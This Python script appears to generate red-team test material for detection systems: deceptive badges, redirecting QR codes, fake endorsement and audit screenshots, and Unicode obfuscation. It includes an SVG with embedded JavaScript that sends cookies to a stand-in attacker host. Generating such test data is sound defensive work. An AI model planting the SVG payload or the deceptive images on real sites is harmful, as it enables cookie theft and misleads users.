#!/usr/bin/env python3
"""
Red Team Attack Scenario Generator

Creates realistic, sophisticated image-based attacks for testing detection systems.
WARNING: For research and defensive purposes only. Do not deploy in production.

Usage:
    python scripts/red_team_attacks.py --scenario homograph_badge
    python scripts/red_team_attacks.py --scenario all --output data/red_team/
"""

import argparse
import logging
from pathlib import Path
from PIL import Image, ImageDraw, ImageFont
import qrcode
import json
from datetime import datetime

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class RedTeamAttackGenerator:
    """Generate sophisticated image-based attacks"""
    
    def __init__(self, output_dir='data/red_team'):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        
        self.scenarios = {
            'homograph_badge': self.create_homograph_badge,
            'subdomain_confusion': self.create_subdomain_confusion_badge,
            'expired_cert_badge': self.create_expired_cert_badge,
            'fake_dependency_count': self.create_fake_dependency_badge,
            'delayed_redirect_qr': self.create_delayed_redirect_qr,
            'geofenced_qr': self.create_geofenced_qr,
            'split_qr': self.create_split_qr_code,
            'qr_in_logo': self.create_qr_in_logo,
            'fake_endorsement': self.create_fake_endorsement,
            'fake_audit_report': self.create_fake_audit_report,
            'fake_download_stats': self.create_fake_download_stats,
            'malicious_svg': self.create_malicious_svg,
            'unicode_art_payload': self.create_unicode_art_payload,
        }
    
    def generate_all(self):
        """Generate all attack scenarios"""
        logger.info(f"Generating {len(self.scenarios)} attack scenarios...")
        
        results = []
        for scenario_name, generator_func in self.scenarios.items():
            logger.info(f"  Generating: {scenario_name}")
            try:
                result = generator_func()
                results.append({
                    'scenario': scenario_name,
                    'status': 'success',
                    'output': result
                })
            except Exception as e:
                logger.error(f"    Failed: {e}")
                results.append({
                    'scenario': scenario_name,
                    'status': 'failed',
                    'error': str(e)
                })
        
        # Save metadata
        metadata_file = self.output_dir / 'metadata.json'
        metadata_file.write_text(json.dumps({
            'generated_at': datetime.now().isoformat(),
            'total_scenarios': len(self.scenarios),
            'results': results
        }, indent=2))
        
        logger.info(f"\n✓ Generated {len(results)} scenarios")
        logger.info(f"  Output: {self.output_dir}")
        
        return results
    
    # ========== Category 1: Badge Manipulation ==========
    
    def create_homograph_badge(self):
        """Create badge with Unicode homograph in URL"""
        # Greek omicron (ο) looks like Latin 'o'
        legitimate_url = "https://github.com/django/django"
        homograph_url = "https://github.com/djangο/djangο"  # Greek omicron
        
        img = Image.new('RGB', (150, 30), color='#4c1')
        draw = ImageDraw.Draw(img)
        
        try:
            font = ImageFont.truetype('arial.ttf', 14)
        except:
            font = ImageFont.load_default()
        
        draw.text((10, 8), "Build: Passing ✓", fill='white', font=font)
        
        output_path = self.output_dir / 'homograph_badge.png'
        img.save(output_path)
        
        metadata = {
            'attack_type': 'homograph_badge',
            'legitimate_url': legitimate_url,
            'malicious_url': homograph_url,
            'visual_difference': 'none',
            'detection_challenge': 'URLs look identical visually',
            'mitigation': 'Punycode conversion, Unicode normalization'
        }
        
        (self.output_dir / 'homograph_badge.json').write_text(json.dumps(metadata, indent=2))
        
        return str(output_path)
    
    def create_subdomain_confusion_badge(self):
        """Create badge with legitimate domain as subdomain"""
        # Looks like: github.com (trusted)
        # Actually: github.com.evil-domain.com
        
        img = Image.new('RGB', (180, 30), color='#28a745')
        draw = ImageDraw.Draw(img)
        
        try:
            font = ImageFont.truetype('arial.ttf', 12)
        except:
            font = ImageFont.load_default()
        
        draw.text((10, 8), "Security: Verified ✓", fill='white', font=font)
        
        output_path = self.output_dir / 'subdomain_confusion_badge.png'
        img.save(output_path)
        
        metadata = {
            'attack_type': 'subdomain_confusion',
            'displayed_domain': 'github.com',
            'actual_url': 'https://api.github.com.attacker-cdn.ru/badge.svg',
            'detection_challenge': 'Users see trusted domain name',
            'mitigation': 'Parse full domain, check TLD'
        }
        
        (self.output_dir / 'subdomain_confusion_badge.json').write_text(json.dumps(metadata, indent=2))
        
        return str(output_path)
    
    def create_expired_cert_badge(self):
        """Create misleading security badge"""
        img = Image.new('RGB', (150, 30), color='#28a745')
        draw = ImageDraw.Draw(img)
        
        try:
            font = ImageFont.truetype('arial.ttf', 14)
        except:
            font = ImageFont.load_default()
        
        draw.text((10, 8), "Security: A+ ✓", fill='white', font=font)
        
        output_path = self.output_dir / 'expired_cert_badge.png'
        img.save(output_path)
        
        metadata = {
            'attack_type': 'expired_cert_badge',
            'displayed_status': 'Security: A+',
            'actual_status': 'Certificate expired 2 years ago',
            'detection_challenge': 'Badge shows outdated information',
            'mitigation': 'Verify badge data freshness, check actual cert status'
        }
        
        (self.output_dir / 'expired_cert_badge.json').write_text(json.dumps(metadata, indent=2))
        
        return str(output_path)
    
    def create_fake_dependency_badge(self):
        """Create badge with inflated dependency count"""
        img = Image.new('RGB', (180, 30), color='#007ec6')
        draw = ImageDraw.Draw(img)
        
        try:
            font = ImageFont.truetype('arial.ttf', 12)
        except:
            font = ImageFont.load_default()
        
        draw.text((10, 8), "Used by: 12K+ projects", fill='white', font=font)
        
        output_path = self.output_dir / 'fake_dependency_badge.png'
        img.save(output_path)
        
        metadata = {
            'attack_type': 'fake_dependency_count',
            'displayed_count': '12,000+',
            'actual_count': 12,
            'inflation_factor': 1000,
            'detection_challenge': 'Social proof manipulation',
            'mitigation': 'Verify count from package registry API'
        }
        
        (self.output_dir / 'fake_dependency_badge.json').write_text(json.dumps(metadata, indent=2))
        
        return str(output_path)
    
    # ========== Category 2: QR Code Attacks ==========
    
    def create_delayed_redirect_qr(self):
        """Create QR code with delayed redirect"""
        # First visit: legitimate
        # Later visits: malicious
        
        qr_url = "https://attacker.com/smart-redirect?target=github.com/project"
        qr = qrcode.QRCode(version=1, box_size=10, border=2)
        qr.add_data(qr_url)
        qr.make(fit=True)
        
        img = qr.make_image(fill_color="black", back_color="white")
        
        output_path = self.output_dir / 'delayed_redirect_qr.png'
        img.save(output_path)
        
        metadata = {
            'attack_type': 'delayed_redirect_qr',
            'qr_url': qr_url,
            'first_visit': 'https://github.com/legitimate/project',
            'subsequent_visits': 'https://phishing-site.com',
            'detection_challenge': 'Initial scan appears safe',
            'mitigation': 'Multiple scans over time, URL reputation check'
        }
        
        (self.output_dir / 'delayed_redirect_qr.json').write_text(json.dumps(metadata, indent=2))
        
        return str(output_path)
    
    def create_geofenced_qr(self):
        """Create QR code with geofencing"""
        qr_url = "https://attacker.com/geo-aware?id=pkg123"
        qr = qrcode.QRCode(version=1, box_size=10, border=2)
        qr.add_data(qr_url)
        qr.make(fit=True)
        
        img = qr.make_image(fill_color="black", back_color="white")
        
        output_path = self.output_dir / 'geofenced_qr.png'
        img.save(output_path)
        
        metadata = {
            'attack_type': 'geofenced_qr',
            'qr_url': qr_url,
            'us_redirect': 'https://github.com/legitimate',
            'other_countries_redirect': 'https://malicious.com',
            'detection_challenge': 'US-based scanners see legitimate site',
            'mitigation': 'Test from multiple geolocations'
        }
        
        (self.output_dir / 'geofenced_qr.json').write_text(json.dumps(metadata, indent=2))
        
        return str(output_path)
    
    def create_split_qr_code(self):
        """Create QR code split across multiple images"""
        # Full QR code
        qr_url = "https://malicious.com/payload"
        qr = qrcode.QRCode(version=1, box_size=10, border=2)
        qr.add_data(qr_url)
        qr.make(fit=True)
        
        full_img = qr.make_image(fill_color="black", back_color="white")
        
        # Split into 3 parts
        width, height = full_img.size
        part_width = width // 3
        
        parts = []
        for i in range(3):
            left = i * part_width
            right = (i + 1) * part_width if i < 2 else width
            part = full_img.crop((left, 0, right, height))
            
            output_path = self.output_dir / f'split_qr_part{i+1}.png'
            part.save(output_path)
            parts.append(str(output_path))
        
        metadata = {
            'attack_type': 'split_qr_code',
            'qr_url': qr_url,
            'parts': parts,
            'detection_challenge': 'Individual parts appear innocent',
            'mitigation': 'Analyze image relationships, detect QR fragments'
        }
        
        (self.output_dir / 'split_qr.json').write_text(json.dumps(metadata, indent=2))
        
        return parts
    
    def create_qr_in_logo(self):
        """Create logo with embedded QR code"""
        # Create a simple logo with QR pattern
        img = Image.new('RGB', (200, 200), color='white')
        draw = ImageDraw.Draw(img)
        
        # Draw decorative pattern that's actually a QR code
        # (Simplified - real implementation would embed actual QR)
        for i in range(0, 200, 20):
            for j in range(0, 200, 20):
                if (i + j) % 40 == 0:
                    draw.rectangle([i, j, i+15, j+15], fill='black')
        
        # Add logo text
        try:
            font = ImageFont.truetype('arial.ttf', 24)
        except:
            font = ImageFont.load_default()
        
        draw.text((50, 170), "MyPackage", fill='black', font=font)
        
        output_path = self.output_dir / 'qr_in_logo.png'
        img.save(output_path)
        
        metadata = {
            'attack_type': 'qr_in_logo',
            'embedded_url': 'https://malicious.com',
            'detection_challenge': 'Looks like decorative pattern',
            'mitigation': 'QR detection on all images, not just obvious QR codes'
        }
        
        (self.output_dir / 'qr_in_logo.json').write_text(json.dumps(metadata, indent=2))
        
        return str(output_path)
    
    # ========== Category 3: Social Engineering ==========
    
    def create_fake_endorsement(self):
        """Create fake GitHub discussion screenshot"""
        img = Image.new('RGB', (600, 300), color='#0d1117')
        draw = ImageDraw.Draw(img)
        
        try:
            font_large = ImageFont.truetype('arial.ttf', 16)
            font_small = ImageFont.truetype('arial.ttf', 12)
        except:
            font_large = ImageFont.load_default()
            font_small = ImageFont.load_default()
        
        # Fake GitHub discussion
        draw.text((20, 20), "torvalds commented:", fill='#58a6ff', font=font_large)
        draw.text((20, 50), "This package is amazing! Highly recommended.", 
                 fill='#c9d1d9', font=font_small)
        draw.text((20, 80), "⭐ 50,000  🍴 10,000", fill='#8b949e', font=font_small)
        
        output_path = self.output_dir / 'fake_endorsement.png'
        img.save(output_path)
        
        metadata = {
            'attack_type': 'fake_endorsement',
            'fake_endorser': 'torvalds (Linus Torvalds)',
            'detection_challenge': 'Users trust authority figures',
            'mitigation': 'Verify endorsements, check actual GitHub discussions'
        }
        
        (self.output_dir / 'fake_endorsement.json').write_text(json.dumps(metadata, indent=2))
        
        return str(output_path)
    
    def create_fake_audit_report(self):
        """Create fake security audit report screenshot"""
        img = Image.new('RGB', (600, 400), color='white')
        draw = ImageDraw.Draw(img)
        
        try:
            font_title = ImageFont.truetype('arial.ttf', 20)
            font_body = ImageFont.truetype('arial.ttf', 14)
        except:
            font_title = ImageFont.load_default()
            font_body = ImageFont.load_default()
        
        # Fake audit report
        draw.text((50, 30), "TrustSec Security Audit Report", fill='#000', font=font_title)
        draw.text((50, 80), "Package: malicious-package", fill='#333', font=font_body)
        draw.text((50, 110), "Audit Date: 2024-10-01", fill='#333', font=font_body)
        draw.text((50, 140), "Conclusion: No vulnerabilities found", fill='#28a745', font=font_body)
        draw.text((50, 170), "✓ Code Review: PASS", fill='#28a745', font=font_body)
        draw.text((50, 200), "✓ Dependency Scan: PASS", fill='#28a745', font=font_body)
        draw.text((50, 230), "✓ Security Tests: PASS", fill='#28a745', font=font_body)
        
        output_path = self.output_dir / 'fake_audit_report.png'
        img.save(output_path)
        
        metadata = {
            'attack_type': 'fake_audit_report',
            'fake_company': 'TrustSec Security (does not exist)',
            'detection_challenge': 'Professional appearance creates trust',
            'mitigation': 'Verify audit company exists, check audit authenticity'
        }
        
        (self.output_dir / 'fake_audit_report.json').write_text(json.dumps(metadata, indent=2))
        
        return str(output_path)
    
    def create_fake_download_stats(self):
        """Create fake PyPI download statistics"""
        img = Image.new('RGB', (500, 300), color='white')
        draw = ImageDraw.Draw(img)
        
        try:
            font_large = ImageFont.truetype('arial.ttf', 24)
            font_small = ImageFont.truetype('arial.ttf', 14)
        except:
            font_large = ImageFont.load_default()
            font_small = ImageFont.load_default()
        
        # Fake stats
        draw.text((50, 30), "PyPI Download Statistics", fill='#000', font=font_large)
        draw.text((50, 80), "malicious-package", fill='#333', font=font_small)
        draw.text((50, 120), "Downloads (last month): 10,000,000", fill='#28a745', font=font_large)
        draw.text((50, 160), "Actual downloads: 100", fill='#dc3545', font=font_small)
        
        output_path = self.output_dir / 'fake_download_stats.png'
        img.save(output_path)
        
        metadata = {
            'attack_type': 'fake_download_stats',
            'displayed_downloads': 10000000,
            'actual_downloads': 100,
            'detection_challenge': 'Social proof manipulation',
            'mitigation': 'Verify stats from official PyPI API'
        }
        
        (self.output_dir / 'fake_download_stats.json').write_text(json.dumps(metadata, indent=2))
        
        return str(output_path)
    
    # ========== Category 4: Novel Attacks ==========
    
    def create_malicious_svg(self):
        """Create SVG with embedded JavaScript"""
        svg_content = """<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
    <rect width="200" height="200" fill="#4c1" />
    <text x="50" y="100" fill="white" font-size="20">Secure Package</text>
    <script type="text/javascript">
        <![CDATA[
        // Malicious JavaScript
        fetch('https://attacker.com/steal', {
            method: 'POST',
            body: JSON.stringify({
                cookies: document.cookie,
                url: window.location.href
            })
        });
        ]]>
    </script>
</svg>"""
        
        output_path = self.output_dir / 'malicious.svg'
        output_path.write_text(svg_content)
        
        metadata = {
            'attack_type': 'malicious_svg',
            'payload': 'JavaScript that steals cookies',
            'detection_challenge': 'SVG can contain executable code',
            'mitigation': 'Sanitize SVG, remove script tags, use CSP'
        }
        
        (self.output_dir / 'malicious_svg.json').write_text(json.dumps(metadata, indent=2))
        
        return str(output_path)
    
    def create_unicode_art_payload(self):
        """Create Unicode art with encoded payload"""
        art = """
╔═══════════════════╗
║  SECURE PACKAGE   ║
║  ✓ Verified       ║
║  ✓ Trusted        ║
╚═══════════════════╝

Hidden payload in Unicode: 
ｅｖｉｌ．ｃｏｍ／ｍａｌｗａｒｅ
(Fullwidth characters encode: evil.com/malware)
"""
        
        output_path = self.output_dir / 'unicode_art.txt'
        output_path.write_text(art)
        
        metadata = {
            'attack_type': 'unicode_art_payload',
            'visible_text': 'Decorative ASCII art',
            'hidden_payload': 'evil.com/malware (in fullwidth Unicode)',
            'detection_challenge': 'Appears decorative, actually functional',
            'mitigation': 'Unicode normalization, detect suspicious patterns'
        }
        
        (self.output_dir / 'unicode_art.json').write_text(json.dumps(metadata, indent=2))
        
        return str(output_path)


def main():
    parser = argparse.ArgumentParser(
        description='Generate red team attack scenarios'
    )
    parser.add_argument(
        '--scenario',
        default='all',
        help='Scenario to generate (or "all")'
    )
    parser.add_argument(
        '--output',
        default='data/red_team',
        help='Output directory'
    )
    
    args = parser.parse_args()
    
    generator = RedTeamAttackGenerator(output_dir=args.output)
    
    if args.scenario == 'all':
        generator.generate_all()
    elif args.scenario in generator.scenarios:
        result = generator.scenarios[args.scenario]()
        logger.info(f"Generated: {result}")
    else:
        logger.error(f"Unknown scenario: {args.scenario}")
        logger.info(f"Available scenarios: {list(generator.scenarios.keys())}")
    
    logger.info("\n" + "="*60)
    logger.info("⚠️  WARNING: These are attack scenarios for research only!")
    logger.info("   Do NOT deploy in production environments.")
    logger.info("   Use for defensive training and detection improvement.")
    logger.info("="*60)


if __name__ == '__main__':
    main()
